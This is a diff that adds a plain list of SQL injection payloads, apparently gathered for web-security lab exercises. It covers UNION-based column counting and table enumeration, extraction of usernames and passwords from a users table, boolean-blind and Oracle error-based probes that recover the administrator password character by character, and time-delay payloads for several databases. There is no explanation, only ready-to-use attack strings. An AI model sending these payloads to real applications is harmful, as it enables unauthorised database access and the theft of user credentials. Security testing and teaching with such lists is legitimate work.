@@ -1,0 +1,66 @@
+' Union Select null--
+' Union Select null,null--
+' Union Select null,null,null--
+' Union Select null,null,null,null--
+' Union Select null,null,null,null,null--
+' Union Select null,null,null,null,null,null--
+' Union Select null,null,null,null,null,null,null--
+'+Union+Select+null--
+'+Union+Select+null,null--
+'+Union+Select+null,null,null--
+'+Union+Select+null,null,null,null--
+'+Union+Select+null,null,null,null,null--
+'+Union+Select+null,null,null,null,null,null--
+'+Union+Select+null,null,null,null,null,null,null--
+'+Union+Select+null#
+'+Union+Select+null,null#
+'+Union+Select+null,null,null#
+'+Union+Select+null,null,null,null#
+'+Union+Select+null,null,null,null,null#
+'+Union+Select+null,null,null,null,null,null#
+'+Union+Select+null,null,null,null,null,null,null#
+id=1 and 1=1
+id=1 and 1=2
+' Union Select null,username||'~'||password from users--
+' Union Select 'abc',null,null--
+' Union Select null,'abc',null--
+' Union Select null,null,'abc'--
+' Union Select null,banner from v$version--
+'+Union+Select+@@version,+null#
+'+Union+Select+'abc','def' from dual
+'+Union+Select+table_name,null+from+all_tables--
+'+Union+Select+column_name,null+from+all_tab_columns+where+table_name='users_abcdef'--
+' and '1'='1
+' and '1'='2
+' and (Select 'a' from users Limit 1)='a
+' and (Select 'a' from users where username='administrator')='a
+' and (Select 'a' from users where username='administrator' and length(password)>1)='a
+' and (Select 'a' from users where username='administrator' and length(password)>5)='a
+' and (Select 'a' from users where username='administrator' and length(password)>10)='a
+' and (Select 'a' from users where username='administrator' and length(password)>15)='a
+' and (Select 'a' from users where username='administrator' and length(password)>20)='a
+' and (Select 'a' from users where username='administrator' and length(password)>30)='a
+' and (Select substr(password,1,1) from users where username='administrator')='a
+' and (Select substr(password,1,1) from users where username='administrator')='b
+' and (Select substr(password,1,1) from users where username='administrator')='c
+'
+''
+'||(Select '')||'
+'||(Select '' from dual)||'
+'||(Select '' from users where Rownum=1)||'
+'||(Select case when (1=1) then to_char(1/0) else '' end from dual)||'
+'||(Select case when (1=2) then to_char(1/0) else '' end from dual)||'
+'||(Select case when (1=1) then to_char(1/0) else '' end from users where username='administrator')||'
+'||(Select case when length(password)>5 then to_char(1/0) else '' end from users where username='administrator')||'
+'||(Select case when length(password)>6 then to_char(1/0) else '' end from users where username='administrator')||'
+'||(Select case when length(password)>7 then to_char(1/0) else '' end from users where username='administrator')||'
+'||(Select case when length(password)>8 then to_char(1/0) else '' end from users where username='administrator')||'
+'||(Select case when length(password)>9 then to_char(1/0) else '' end from users where username='administrator')||'
+'||(Select case when length(password)>10 then to_char(1/0) else '' end from users where username='administrator')||'
+'||(Select case when substr(password,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'
+'||pg_sleep(10)--
+'||sleep(10)--
+' sleep(10)--
+' dbms_pipe.receive_message(('a'),10)
+'; if (1=1) waitfor delay '0:0:10'--
+' Select sleep(10)
